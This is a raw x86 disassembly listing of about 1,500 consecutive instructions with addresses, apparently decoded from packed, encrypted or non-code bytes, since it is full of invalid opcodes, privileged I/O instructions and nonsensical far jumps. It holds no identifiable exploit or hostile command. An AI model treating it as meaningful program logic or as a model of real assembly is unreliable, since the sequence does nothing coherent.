  41aa18:	dec    eax
  41aa19:	add    DWORD PTR [ecx+0xd61f8f7],edx
  41aa1f:	cli    
  41aa20:	and    dh,BYTE PTR [edx]
  41aa22:	mov    cl,0x6f
  41aa24:	xchg   esp,eax
  41aa25:	ret    0x4c1d
  41aa28:	xor    ch,BYTE PTR [ebx+ecx*4-0x298aada2]
  41aa2f:	pop    edx
  41aa30:	clc    
  41aa31:	fdiv   DWORD PTR [ebx-0x38eff212]
  41aa37:	and    bh,BYTE PTR [edx-0x3d85e437]
  41aa3d:	jp     0x41aaa6
  41aa3f:	pop    es
  41aa40:	dec    eax
  41aa41:	inc    esp
  41aa42:	inc    esp
  41aa43:	xchg   edi,eax
  41aa44:	fs cmp eax,0xd6dc2ea1
  41aa4a:	adc    eax,0x6141b281
  41aa4f:	push   ss
  41aa50:	or     esp,DWORD PTR [ecx+ebp*1]
  41aa53:	sub    eax,0xabfd6e51
  41aa58:	ror    DWORD PTR [eax],0xef
  41aa5b:	inc    ebx
  41aa5c:	fisttp QWORD PTR ds:0xabfe2f80
  41aa62:	sub    ebp,DWORD PTR ds:0x174ef9e0
  41aa68:	test   DWORD PTR [edx-0x55ae3ac7],ecx
  41aa6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa6f:	sub    BYTE PTR [ebp-0x3b],ah
  41aa72:	add    esp,DWORD PTR [edi]
  41aa74:	xchg   ebx,eax
  41aa75:	cmp    ch,BYTE PTR [edx-0x491d2285]
  41aa7b:	xor    al,0xf4
  41aa7d:	xchg   esp,eax
  41aa7e:	dec    eax
  41aa7f:	add    BYTE PTR [esi+edx*1],al
  41aa82:	retf   
  41aa83:	jge    0x41aa7c
  41aa85:	xor    eax,0x29df3056
  41aa8a:	sbb    dh,BYTE PTR [ebp-0x70]
  41aa8d:	push   ds
  41aa8e:	xchg   esi,eax
  41aa8f:	jmp    0x74a6:0x38f4fca8
  41aa96:	mov    ecx,0x432ef9a2
  41aa9b:	mov    ah,0xac
  41aa9d:	jl     0x41aa58
  41aa9f:	dec    eax
  41aaa0:	dec    edx
  41aaa1:	das    
  41aaa2:	xor    eax,0xa1fa36aa
  41aaa7:	cmp    eax,0x3a52ea7e
  41aaac:	dec    ebx
  41aaad:	in     eax,dx
  41aaae:	jp     0x41aa8f
  41aab0:	mov    cs,WORD PTR [eax+0x24ab75b1]
  41aab6:	xor    esi,DWORD PTR [ebx+0x7656461c]
  41aabc:	cmc    
  41aabd:	imul   esi,edx,0x45d45a86
  41aac3:	cmp    bh,BYTE PTR [eax+esi*4]
  41aac6:	(bad)  
  41aac7:	fdivr  DWORD PTR [edi]
  41aac9:	push   ebx
  41aaca:	dec    esi
  41aacb:	xor    esi,edx
  41aacd:	dec    ecx
  41aace:	mov    al,ds:0xf212a5b6
  41aad3:	push   ecx
  41aad4:	push   ss
  41aad5:	repnz or BYTE PTR [edi],bh
  41aad8:	test   BYTE PTR [ebx+edi*1+0x2b],ah
  41aadc:	mov    al,ds:0xbf798232
  41aae1:	std    
  41aae2:	pop    DWORD PTR [ebx+0x584e7da9]
  41aae8:	dec    al
  41aaea:	ins    BYTE PTR es:[edi],dx
  41aaeb:	rol    BYTE PTR [eax-0x4f],1
  41aaee:	or     DWORD PTR [edi],0x29
  41aaf1:	sub    al,0xc2
  41aaf3:	daa    
  41aaf4:	mov    bh,0x4a
  41aaf6:	push   esp
  41aaf7:	dec    esp
  41aaf8:	sbb    al,0xec
  41aafa:	mov    edi,0x3795183a
  41aaff:	out    dx,eax
  41ab00:	data16 jle 0x41ab73
  41ab03:	fcmove st,st(6)
  41ab05:	add    dl,BYTE PTR ds:0xa36294ec
  41ab0b:	jp     0x41ab39
  41ab0d:	xor    cl,BYTE PTR [bp+di-0x47]
  41ab11:	jecxz  0x41ab7c
  41ab13:	stos   DWORD PTR es:[edi],eax
  41ab14:	xor    eax,0xe0410d2d
  41ab19:	xchg   edx,eax
  41ab1a:	add    eax,DWORD PTR ds:0x4a83415c
  41ab20:	pop    esp
  41ab21:	fimul  DWORD PTR [ebx-0x7f27dad0]
  41ab27:	pop    ss
  41ab28:	or     BYTE PTR [edx+0x3a],bl
  41ab2b:	or     eax,0xdda63fe0
  41ab30:	and    al,0x8
  41ab32:	add    esp,DWORD PTR ds:0x3abe263
  41ab38:	ror    BYTE PTR [eax-0x2d8c4bca],1
  41ab3e:	bound  ebp,QWORD PTR [edi]
  41ab40:	pop    ebx
  41ab41:	inc    edx
  41ab42:	test   BYTE PTR [ebp+edx*8-0xb77adb6],dh
  41ab49:	lods   eax,DWORD PTR ds:[esi]
  41ab4a:	sbb    ah,BYTE PTR [edx+0x599890ba]
  41ab50:	outs   dx,BYTE PTR ds:[esi]
  41ab51:	and    esp,DWORD PTR [edi+0x3d41c3fc]
  41ab57:	add    DWORD PTR [esi-0x50],edi
  41ab5a:	mov    BYTE PTR [edi+0x573c89da],dl
  41ab60:	or     BYTE PTR [ecx+0x6d],ch
  41ab63:	fld    TBYTE PTR [esi+edi*2]
  41ab66:	push   es
  41ab67:	scas   eax,DWORD PTR es:[edi]
  41ab68:	jnp    0x41ab7d
  41ab6a:	xor    DWORD PTR [edx+0x73],esp
  41ab6d:	jnp    0x41abc0
  41ab6f:	jp     0x41abec
  41ab71:	push   0xffffff8f
  41ab73:	jbe    0x41aba2
  41ab75:	jmp    FWORD PTR [ecx+0x76]
  41ab78:	mov    dh,0xb7
  41ab7a:	les    ecx,FWORD PTR [edi+esi*2+0x22b0ee5b]
  41ab81:	pop    esp
  41ab82:	cmp    BYTE PTR [edi-0x43],ah
  41ab85:	dec    ebx
  41ab86:	repnz cmova edi,DWORD PTR [ecx-0x71e29b85]
  41ab8e:	data16 mov bh,0x31
  41ab91:	cmc    
  41ab92:	add    BYTE PTR [ebx+0x56f369fd],0x9e
  41ab99:	or     DWORD PTR [edx+0x31bfe4ca],edi
  41ab9f:	jb     0x41ac15
  41aba1:	inc    edx
  41aba2:	pop    edx
  41aba3:	fstp   TBYTE PTR [eax+0x2cc7f7ec]
  41aba9:	popf   
  41abaa:	sub    ebp,eax
  41abac:	call   0x2e6038ca
  41abb1:	imul   DWORD PTR [edx]
  41abb3:	sti    
  41abb4:	and    BYTE PTR [edi-0x27e701a6],bh
  41abba:	pop    ds
  41abbb:	mov    DWORD PTR [edi+0x53],ebp
  41abbe:	test   al,0x8f
  41abc0:	mov    dl,0x34
  41abc2:	std    
  41abc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc4:	test   DWORD PTR [ebx+edx*2-0x289e357d],ecx
  41abcb:	stc    
  41abcc:	or     ch,BYTE PTR [esi+0x57]
  41abcf:	or     esp,eax
  41abd1:	out    dx,eax
  41abd2:	jae    0x41ac1e
  41abd4:	out    dx,eax
  41abd5:	adc    ah,BYTE PTR [edx-0x18]
  41abd8:	lock std 
  41abda:	ins    DWORD PTR es:[edi],dx
  41abdb:	jl     0x41abd9
  41abdd:	loop   0x41abf3
  41abdf:	jns    0x41abd0
  41abe1:	dec    edx
  41abe2:	push   eax
  41abe3:	mov    esp,0xaca9da59
  41abe8:	cld    
  41abe9:	or     eax,0xb1cd65fb
  41abee:	inc    edi
  41abef:	into   
  41abf0:	cmp    ecx,DWORD PTR ds:0xc80d2f0
  41abf6:	cmp    DWORD PTR [edi-0x1b],ebp
  41abf9:	inc    ecx
  41abfa:	dec    ebx
  41abfb:	lods   eax,DWORD PTR ds:[esi]
  41abfc:	mov    ds:0x670b12ea,al
  41ac01:	dec    edx
  41ac02:	arpl   WORD PTR [eax],ax
  41ac04:	push   ds
  41ac05:	dec    edx
  41ac06:	jnp    0x41ac7d
  41ac08:	pop    ss
  41ac09:	nop
  41ac0a:	repz pop ebx
  41ac0c:	shr    BYTE PTR [ecx+0x2e],0x41
  41ac10:	adc    eax,0x99204e39
  41ac15:	test   DWORD PTR [ebp+0x78],0xbf1a8417
  41ac1c:	(bad)  
  41ac1e:	test   DWORD PTR [edi+0x6b18d889],ecx
  41ac24:	pushf  
  41ac25:	rcl    DWORD PTR [ebp-0x41],0xd6
  41ac29:	aam    0x8e
  41ac2b:	mov    bl,BYTE PTR [eax+ebx*1+0x23dbc2b7]
  41ac32:	mov    BYTE PTR [esi-0x45b1d637],dh
  41ac38:	or     DWORD PTR [edx+0x6ab204ce],ebp
  41ac3e:	int    0x1d
  41ac40:	dec    esp
  41ac41:	and    eax,0xb6c0cf01
  41ac46:	jbe    0x41ac3e
  41ac48:	push   es
  41ac49:	jmp    0x41ac97
  41ac4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac4c:	sub    eax,0x39d1519f
  41ac51:	rcl    DWORD PTR [edi-0x1f],0x22
  41ac55:	and    bl,dh
  41ac57:	inc    eax
  41ac58:	retf   0x8375
  41ac5b:	js     0x41ac5b
  41ac5d:	xlat   BYTE PTR ds:[ebx]
  41ac5e:	scas   al,BYTE PTR es:[edi]
  41ac5f:	dec    eax
  41ac60:	inc    edi
  41ac61:	fs pop es
  41ac63:	aad    0x69
  41ac65:	and    al,0xdb
  41ac67:	clc    
  41ac68:	mov    BYTE PTR [ebx+0x31a73aa3],bl
  41ac6e:	lods   eax,DWORD PTR ds:[esi]
  41ac6f:	inc    DWORD PTR [edx+0x21]
  41ac72:	jo     0x41ac9d
  41ac74:	(bad)  
  41ac75:	sbb    DWORD PTR [ebx-0x3c],esi
  41ac78:	ds out 0x81,al
  41ac7b:	and    BYTE PTR [ebp+0x7b],bl
  41ac7e:	aad    0x11
  41ac80:	sub    al,0xbe
  41ac82:	enter  0x89c0,0x69
  41ac86:	inc    ecx
  41ac87:	loopne 0x41ad07
  41ac89:	fwait
  41ac8a:	push   ebx
  41ac8b:	dec    edx
  41ac8c:	inc    ebp
  41ac8d:	test   DWORD PTR [esi],eax
  41ac8f:	scas   eax,DWORD PTR es:[edi]
  41ac90:	adc    edx,DWORD PTR [ebx+0x57b1d7c4]
  41ac96:	es std 
  41ac98:	pop    ds
  41ac99:	mov    al,0xbc
  41ac9b:	xchg   ch,dh
  41ac9d:	jecxz  0x41acef
  41ac9f:	cmp    ecx,DWORD PTR [esi+0x10]
  41aca2:	shr    BYTE PTR [ecx],cl
  41aca4:	test   al,0xff
  41aca6:	mov    edx,0x2008086c
  41acab:	push   eax
  41acac:	sub    dh,BYTE PTR [eax]
  41acae:	test   al,0x4b
  41acb0:	pop    eax
  41acb1:	and    DWORD PTR [ebp+0x6a],0xee0043f9
  41acb8:	cmp    al,0x27
  41acba:	jbe    0x41acd0
  41acbc:	mov    ds:0xbc2d1cfd,al
  41acc1:	inc    ebx
  41acc2:	mov    dh,0x3e
  41acc4:	(bad)  
  41acc5:	call   0xcf76:0x432937d1
  41accc:	ror    ah,1
  41acce:	push   eax
  41accf:	bound  ebp,QWORD PTR [edi]
  41acd1:	xchg   edx,eax
  41acd2:	or     al,0x64
  41acd4:	fwait
  41acd5:	test   ecx,ecx
  41acd7:	push   0xc9275bed
  41acdc:	mov    ecx,ebp
  41acde:	mov    eax,0x75fd6e64
  41ace3:	mov    DWORD PTR [edi+0x11c264f0],eax
  41ace9:	lods   al,BYTE PTR ds:[esi]
  41acea:	sar    bl,cl
  41acec:	std    
  41aced:	clc    
  41acee:	cmp    DWORD PTR [ecx],0xc917ec51
  41acf4:	xchg   edx,eax
  41acf5:	cmp    cl,dh
  41acf7:	sahf   
  41acf8:	idiv   ch
  41acfa:	ss imul ebx
  41acfd:	out    0x5b,eax
  41acff:	add    al,0x37
  41ad01:	mov    bl,0x2a
  41ad03:	js     0x41acc6
  41ad05:	add    edi,DWORD PTR [edx]
  41ad07:	retf   0xfece
  41ad0a:	mov    ds,edi
  41ad0c:	inc    eax
  41ad0d:	pop    eax
  41ad0e:	into   
  41ad0f:	push   esp
  41ad10:	test   eax,0xe03b531f
  41ad15:	mov    BYTE PTR [edi-0x64],0x0
  41ad19:	sub    eax,DWORD PTR [ecx-0x11]
  41ad1c:	jg     0x41acb2
  41ad1e:	push   ebx
  41ad1f:	out    dx,al
  41ad20:	push   ss
  41ad21:	shl    BYTE PTR [ebx-0x4c],1
  41ad24:	cdq    
  41ad25:	popa   
  41ad26:	es dec ecx
  41ad28:	dec    eax
  41ad29:	mov    edi,0x8ad42792
  41ad2e:	cmp    BYTE PTR [esi],ah
  41ad30:	cmc    
  41ad31:	stos   DWORD PTR es:[edi],eax
  41ad32:	imul   edi,DWORD PTR [ecx],0x33
  41ad35:	sub    DWORD PTR [edx+0x51653d39],ebx
  41ad3b:	jne    0x41ad25
  41ad3d:	mov    ds:0xbc63f1bf,al
  41ad42:	scas   eax,DWORD PTR es:[edi]
  41ad43:	push   cs
  41ad44:	add    eax,DWORD PTR [ecx+ebx*8-0x6f5262ae]
  41ad4b:	outs   dx,BYTE PTR ss:[esi]
  41ad4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad4e:	out    0x8e,al
  41ad50:	mov    ds:0x6c8a799c,al
  41ad55:	seto   BYTE PTR [edx]
  41ad58:	pop    edx
  41ad59:	mov    edi,0xfd2be139
  41ad5e:	arpl   bp,dx
  41ad60:	mov    ch,0xe3
  41ad62:	pop    ebp
  41ad63:	cmp    ch,BYTE PTR [eax-0x67]
  41ad66:	dec    ebx
  41ad67:	fsub   QWORD PTR [edx-0x6e86f3fb]
  41ad6d:	xchg   edx,eax
  41ad6e:	mov    ?,WORD PTR [eax+edx*1-0x34]
  41ad72:	gs stos BYTE PTR es:[edi],al
  41ad74:	jmp    0x7f30:0xdd24452
  41ad7b:	aas    
  41ad7c:	cmp    BYTE PTR [esi-0x60acb0bc],0x67
  41ad83:	mov    ch,0x6e
  41ad85:	fwait
  41ad86:	je     0x41ada3
  41ad88:	lds    ebx,FWORD PTR [ecx+0x4a5b75ff]
  41ad8e:	push   esi
  41ad8f:	mov    eax,0x3768be7f
  41ad94:	in     eax,0xb6
  41ad96:	mov    gs,WORD PTR [ebp-0x44]
  41ad99:	sbb    ebx,ebp
  41ad9b:	imul   edx,ebp,0xf
  41ad9e:	xchg   ebp,edi
  41ada0:	call   0x8a6dce10
  41ada5:	mov    dh,0xc8
  41ada7:	cmc    
  41ada8:	xchg   edx,eax
  41ada9:	dec    ebx
  41adaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adab:	mov    ecx,0x95cc3c2a
  41adb0:	imul   edi,DWORD PTR [edi],0xfffffff6
  41adb3:	push   ds
  41adb4:	int3   
  41adb5:	in     al,0xf5
  41adb7:	test   BYTE PTR [eax-0xe3cf6e],0x23
  41adbe:	mov    esi,0xd8c52115
  41adc3:	je     0x41ad8c
  41adc5:	lods   eax,DWORD PTR ds:[esi]
  41adc6:	add    DWORD PTR [edx+0x34],eax
  41adc9:	adc    al,0x15
  41adcb:	cmp    eax,0x6760d6df
  41add0:	mov    dl,0x70
  41add2:	test   al,0xbb
  41add4:	sbb    al,0x6b
  41add6:	js     0x41ad80
  41add8:	mov    edi,0x5ec24f69
  41addd:	dec    ecx
  41adde:	das    
  41addf:	call   0x292eddfb
  41ade4:	cld    
  41ade5:	test   BYTE PTR ds:0x75d20e20,dl
  41adeb:	cmp    al,0x7a
  41aded:	imul   esp,DWORD PTR ds:0x63df9c21,0x36
  41adf4:	cmp    edx,DWORD PTR [edi+0x6a25e75c]
  41adfa:	xchg   edi,eax
  41adfb:	mov    esi,0x97163d5b
  41ae00:	mov    bh,BYTE PTR [esi-0x71a128ba]
  41ae06:	je     0x41ad9a
  41ae08:	jne    0x41adfc
  41ae0a:	cli    
  41ae0b:	icebp  
  41ae0c:	mov    ds:0x3d71ceba,eax
  41ae11:	xchg   esi,eax
  41ae12:	aas    
  41ae13:	mov    BYTE PTR [ebp-0x1a6f9699],ah
  41ae19:	jge    0x41ae48
  41ae1b:	push   edx
  41ae1c:	jbe    0x41adbb
  41ae1e:	(bad)  
  41ae1f:	in     al,0x72
  41ae21:	inc    ecx
  41ae22:	cmp    al,0x9f
  41ae24:	adc    edx,DWORD PTR [ebp-0x1180f095]
  41ae2a:	pop    es
  41ae2b:	push   es
  41ae2c:	inc    ecx
  41ae2d:	pop    eax
  41ae2e:	lds    esp,FWORD PTR [ecx+edi*4]
  41ae31:	mov    edi,0xdd4876af
  41ae36:	retf   0x5119
  41ae39:	aas    
  41ae3a:	mov    BYTE PTR [ebx+ebp*8],ch
  41ae3d:	dec    esi
  41ae3e:	jmp    0x74bf7765
  41ae43:	or     al,0xba
  41ae45:	retf   0x8637
  41ae48:	enter  0xcbcf,0x33
  41ae4c:	pop    ds
  41ae4d:	jp     0x41add4
  41ae4f:	call   0xba0f6544
  41ae54:	cmc    
  41ae55:	iret   
  41ae56:	int    0xed
  41ae58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae59:	push   ecx
  41ae5b:	xchg   edx,eax
  41ae5c:	mov    ds:0xd4d6366c,al
  41ae61:	outs   dx,BYTE PTR ds:[esi]
  41ae62:	js     0x41adef
  41ae64:	inc    ecx
  41ae65:	mov    dl,0x91
  41ae67:	push   eax
  41ae68:	into   
  41ae69:	cld    
  41ae6a:	js     0x41ae81
  41ae6c:	cmp    ecx,DWORD PTR [esi-0x4c550987]
  41ae72:	dec    esi
  41ae73:	inc    eax
  41ae74:	das    
  41ae75:	popf   
  41ae76:	imul   edi,DWORD PTR [esi-0x22873a91],0xffffffc6
  41ae7d:	mov    eax,ds:0x16347766
  41ae82:	or     ah,BYTE PTR [ecx+ebp*1]
  41ae85:	cmp    al,0xba
  41ae88:	push   es
  41ae89:	dec    edx
  41ae8a:	push   ecx
  41ae8b:	aaa    
  41ae8c:	and    eax,0x8270e798
  41ae91:	or     DWORD PTR [ebp+ebp*4-0xd27e19a],edx
  41ae98:	mov    ebx,0x85aac15c
  41ae9d:	(bad)  
  41ae9e:	call   0x290720a6
  41aea3:	jns    0x41aee0
  41aea5:	jae    0x41aeb0
  41aea7:	push   esp
  41aea8:	jo     0x41ae47
  41aeaa:	pop    ebp
  41aeab:	out    0xd5,eax
  41aead:	pop    ecx
  41aeae:	sbb    edi,ecx
  41aeb0:	cwde   
  41aeb1:	int3   
  41aeb2:	and    al,0x2b
  41aeb4:	lods   al,BYTE PTR ds:[esi]
  41aeb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb6:	adc    dl,ch
  41aeb8:	sar    BYTE PTR [ebx],cl
  41aeba:	sbb    al,0x13
  41aebc:	or     al,0xce
  41aebe:	adc    esp,esp
  41aec0:	dec    esp
  41aec1:	shr    DWORD PTR [edi+0xd],cl
  41aec4:	mov    ds:0x8194b277,eax
  41aec9:	into   
  41aeca:	mov    esi,0x4e89d3d5
  41aecf:	test   eax,0x4103a6ff
  41aed4:	inc    ebx
  41aed5:	mov    al,ds:0x10fdbce1
  41aeda:	add    ebp,eax
  41aedc:	mov    ebp,0x74670067
  41aee1:	out    dx,al
  41aee2:	lea    eax,[ecx]
  41aee4:	mov    eax,ds:0xcb610cd6
  41aee9:	bnd jbe 0x41ae8d
  41aeec:	inc    edi
  41aeed:	lea    eax,[eax-0x4db0fdea]
  41aef3:	push   ds
  41aef4:	add    eax,0x8dfc0b72
  41aef9:	in     al,0xfe
  41aefb:	sbb    bl,dl
  41aefd:	inc    eax
  41aefe:	or     edi,DWORD PTR [esi]
  41af00:	popa   
  41af01:	dec    ebp
  41af02:	fcom   QWORD PTR [esi-0x4]
  41af05:	mov    dl,0x9c
  41af07:	(bad)
  41af0a:	mov    bh,0xa2
  41af0c:	jnp    0x41af0b
  41af0e:	jecxz  0x41aedb
  41af10:	enter  0xd2d1,0xc1
  41af14:	int    0xd1
  41af16:	mov    dl,BYTE PTR [eax-0x27]
  41af19:	xchg   ebx,eax
  41af1a:	loop   0x41aec2
  41af1c:	xchg   DWORD PTR [esi],ebp
  41af1e:	mov    ch,0x76
  41af20:	aam    0x4
  41af22:	mov    al,ds:0x86489ef5
  41af27:	fs lahf 
  41af29:	dec    edi
  41af2a:	sub    ebp,DWORD PTR [edi-0x4e37b9ef]
  41af30:	daa    
  41af31:	nop
  41af32:	adc    dh,BYTE PTR [ecx+edi*4]
  41af35:	xchg   edi,eax
  41af36:	jbe    0x41af29
  41af38:	jnp    0x41af0a
  41af3a:	sar    DWORD PTR [ecx+0x5a568914],cl
  41af40:	sub    BYTE PTR [ebx],al
  41af42:	lods   al,BYTE PTR ss:[esi]
  41af44:	loope  0x41af9b
  41af46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af47:	fnstcw WORD PTR [eax-0x65]
  41af4a:	sti    
  41af4b:	jle    0x41af3a
  41af4d:	ds inc ebx
  41af4f:	or     eax,0x396a3040
  41af54:	clc    
  41af55:	xlat   BYTE PTR ds:[ebx]
  41af56:	pop    ss
  41af57:	ins    DWORD PTR es:[edi],dx
  41af58:	cmp    al,0x2e
  41af5a:	ds scas eax,DWORD PTR es:[edi]
  41af5c:	cmp    eax,0x7031f8a6
  41af61:	push   0xe
  41af63:	or     al,0x9c
  41af65:	sahf   
  41af66:	cli    
  41af67:	test   al,0x0
  41af69:	add    ecx,DWORD PTR [ebp+0x63]
  41af6c:	aam    0xf8
  41af6e:	pop    ebx
  41af6f:	jge    0x41afa6
  41af71:	retf   0xed1e
  41af74:	cld    
  41af75:	jg     0x41af1d
  41af77:	call   0xa1be8c06
  41af7c:	cmc    
  41af7d:	rcl    BYTE PTR [ecx],1
  41af7f:	push   ss
  41af80:	cwde   
  41af81:	cmp    eax,0xcf69e0a9
  41af86:	mov    edx,fs
  41af88:	lods   al,BYTE PTR ds:[esi]
  41af89:	push   edx
  41af8a:	xchg   ebx,eax
  41af8b:	lock ret 0x1d70
  41af8f:	imul   ch
  41af91:	lods   al,BYTE PTR ds:[esi]
  41af92:	sahf   
  41af93:	adc    DWORD PTR [esi+0x6926b0dc],edx
  41af99:	frstor [ecx]
  41af9b:	sbb    esp,esp
  41af9d:	test   BYTE PTR [ecx-0x9bff2bb],dl
  41afa3:	mov    edi,0x976e7ace
  41afa8:	repnz dec ebx
  41afaa:	lea    eax,fs:[edx-0x63fcf4]
  41afb1:	add    cl,dl
  41afb3:	and    bh,BYTE PTR [ebx]
  41afb5:	xchg   edx,eax
  41afb6:	mov    al,ds:0xc8ce624c
  41afbb:	jae    0x41afa9
  41afbd:	xor    ebx,DWORD PTR [edi-0x7a]
  41afc0:	int3   
  41afc1:	and    ah,al
  41afc3:	fst    QWORD PTR [esi]
  41afc5:	loop   0x41af7a
  41afc7:	in     al,dx
  41afc8:	pop    ebp
  41afc9:	mov    ah,0x44
  41afcb:	idiv   DWORD PTR [esi]
  41afcd:	data16 (bad) 
  41afcf:	jnp    0x41af67
  41afd1:	call   0x4b13:0x971a86f8
  41afd8:	mov    bh,0xd7
  41afda:	mov    ?,WORD PTR [edx+0x5e83f53e]
  41afe0:	inc    esi
  41afe1:	mov    ds:0x139bbb43,al
  41afe6:	mov    al,ds:0x70f5718
  41afeb:	shr    BYTE PTR [eax-0x29],cl
  41afee:	pop    esp
  41afef:	lds    esp,FWORD PTR [ebx-0x7c3fb45f]
  41aff5:	std    
  41aff6:	(bad)  
  41aff8:	(bad)  
  41aff9:	xchg   edx,eax
  41affa:	sbb    ch,BYTE PTR [edx]
  41affc:	jg     0x41b072
  41affe:	stc    
  41afff:	push   esi
  41b000:	repz add bh,BYTE PTR [ecx-0x5263f485]
  41b007:	ss push ds
  41b009:	ror    BYTE PTR [edi+ecx*4],0x69
  41b00d:	jp     0x41b07b
  41b00f:	mov    bl,0x91
  41b011:	sub    dh,BYTE PTR ds:0xfed595a9
  41b017:	xor    DWORD PTR [esi-0x1f],ecx
  41b01a:	push   edx
  41b01b:	ins    DWORD PTR es:[edi],dx
  41b01c:	fldcw  WORD PTR [esi+0x34]
  41b01f:	shl    DWORD PTR [esi],0xff
  41b022:	cs mov bh,0x8b
  41b025:	pop    ss
  41b026:	cmp    eax,0x46f55156
  41b02b:	mov    bh,0x20
  41b02d:	dec    edx
  41b02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b02f:	sub    dl,BYTE PTR [esi-0x32d62aee]
  41b035:	pop    DWORD PTR ds:0x6a486a5c
  41b03b:	or     ah,dl
  41b03d:	shl    DWORD PTR [edi-0xb],0xae
  41b041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b042:	xor    eax,0xbe837f4f
  41b047:	lock sbb DWORD PTR [edi-0x25],ecx
  41b04b:	nop
  41b04c:	jmp    0x16a02f59
  41b051:	add    al,0x3d
  41b053:	(bad)  
  41b055:	psrad  mm7,mm0
  41b058:	pop    ds
  41b059:	addr16 push ebx
  41b05b:	ds leave 
  41b05d:	(bad)  
  41b05e:	xchg   ebp,eax
  41b05f:	mov    ds:0xa00ddb8f,eax
  41b064:	and    DWORD PTR [eax],eax
  41b066:	or     DWORD PTR [eax-0x967016d],ebp
  41b06c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b06e:	jmp    0x75df:0x4ae49acd
  41b075:	pop    esi
  41b076:	mov    ch,0x6f
  41b078:	mov    al,ds:0xfea83ca0
  41b07d:	jmp    0xc929d4c0
  41b082:	call   0xea6d:0x56e854e4
  41b089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b08a:	jge    0x41b0a0
  41b08c:	mov    eax,0x1b90e866
  41b091:	daa    
  41b092:	sub    eax,0x277e5601
  41b097:	out    dx,eax
  41b098:	mov    ds:0xe2a496e2,eax
  41b09d:	das    
  41b09e:	mov    esp,0xf21155c9
  41b0a3:	pop    esp
  41b0a4:	ror    BYTE PTR [ebx+ebp*8+0x20333954],cl
  41b0ab:	push   es
  41b0ac:	loope  0x41b0b2
  41b0ae:	call   0xd767:0xa9d5ebaa
  41b0b5:	push   es
  41b0b6:	inc    eax
  41b0b7:	scas   al,BYTE PTR es:[edi]
  41b0b8:	lock mov dl,0x3
  41b0bb:	xchg   edi,eax
  41b0bc:	retf   
  41b0bd:	mov    ebp,0x74539288
  41b0c2:	(bad)  
  41b0c3:	out    dx,eax
  41b0c4:	sbb    DWORD PTR [esi-0x18884a61],edx
  41b0ca:	js     0x41b0ad
  41b0cc:	or     al,0x67
  41b0ce:	add    ecx,DWORD PTR [edx+0x35]
  41b0d1:	pop    eax
  41b0d2:	(bad)  
  41b0d3:	mov    dl,BYTE PTR [eax+0x75604014]
  41b0d9:	cmp    DWORD PTR ds:0xc0a341b0,edx
  41b0df:	xor    bh,BYTE PTR [ecx]
  41b0e1:	jecxz  0x41b12b
  41b0e3:	add    al,0x5e
  41b0e5:	xchg   BYTE PTR [edx],ch
  41b0e7:	imul   eax,DWORD PTR [ecx+0x6bb3a94a],0x1c
  41b0ee:	stos   DWORD PTR es:[edi],eax
  41b0ef:	cmp    eax,0x2c2f8c33
  41b0f4:	mov    esp,0xd44cddb8
  41b0f9:	fs je  0x41b118
  41b0fc:	(bad)  [esi-0x53]
  41b0ff:	call   0x6c098f84
  41b104:	sub    DWORD PTR gs:0xfb035847,eax
  41b10b:	jae    0x41b170
  41b10d:	retf   0xfbea
  41b110:	(bad)  
  41b111:	sub    eax,0xe9dbd7d8
  41b116:	xchg   ebx,eax
  41b117:	popa   
  41b118:	dec    ebx
  41b119:	and    ebp,DWORD PTR [edi]
  41b11b:	inc    ebp
  41b11c:	or     dh,dh
  41b11e:	mov    ah,BYTE PTR [ecx+0x79b58a92]
  41b124:	daa    
  41b125:	add    dh,BYTE PTR [ebx-0x35fe0546]
  41b12b:	(bad)  
  41b12c:	out    dx,eax
  41b12d:	ret    
  41b12e:	cmp    al,0x2a
  41b130:	sbb    ebx,ebp
  41b132:	frstor [ebx]
  41b134:	push   esi
  41b135:	js     0x41b0de
  41b137:	mov    edx,0xf8f6bdd0
  41b13c:	loope  0x41b184
  41b13e:	sbb    eax,0x39f38d04
  41b143:	inc    esp
  41b144:	in     al,dx
  41b145:	sar    DWORD PTR [edx+0x0],0xd5
  41b149:	xor    edx,DWORD PTR ds:0xd309549c
  41b14f:	sub    DWORD PTR [ebp+edx*8-0x4f76a956],0xd5aef936
  41b15a:	xor    eax,DWORD PTR [edx]
  41b15c:	mov    dh,0x45
  41b15e:	push   cs
  41b15f:	xor    dh,dh
  41b161:	xor    ebp,DWORD PTR [edx+0x30c9de19]
  41b167:	add    DWORD PTR [eax],edx
  41b169:	mov    edx,0xca71c126
  41b16e:	aas    
  41b16f:	ins    DWORD PTR es:[edi],dx
  41b170:	inc    ebp
  41b172:	sahf   
  41b173:	sub    edx,esi
  41b175:	shr    ch,0xab
  41b178:	ds mov bh,0x65
  41b17b:	pop    edi
  41b17c:	out    dx,al
  41b17d:	std    
  41b17e:	and    al,0x64
  41b180:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41b182:	mov    dh,0x89
  41b184:	dec    ebx
  41b185:	push   0xffffffb7
  41b187:	fst    DWORD PTR cs:[edi+0x52]
  41b18b:	and    DWORD PTR [edx+0x14],esp
  41b18e:	sub    DWORD PTR [ebx-0x7],0xffffffe8
  41b192:	retf   
  41b193:	shl    DWORD PTR [esi+0x5feff9df],1
  41b199:	pop    eax
  41b19a:	test   BYTE PTR [eax],bh
  41b19c:	cmp    ebp,DWORD PTR [ebx]
  41b19e:	xchg   esp,eax
  41b19f:	mov    ebp,0x58d5a514
  41b1a4:	scas   eax,DWORD PTR es:[edi]
  41b1a5:	sub    eax,0xe1b769d5
  41b1aa:	fdivr  DWORD PTR [ebp-0x6d]
  41b1ad:	ret    
  41b1ae:	sub    eax,0x8aae123
  41b1b3:	cdq    
  41b1b4:	nop
  41b1b5:	pop    edi
  41b1b6:	stos   BYTE PTR es:[edi],al
  41b1b7:	stc    
  41b1b8:	lock mov esp,0x9c57da13
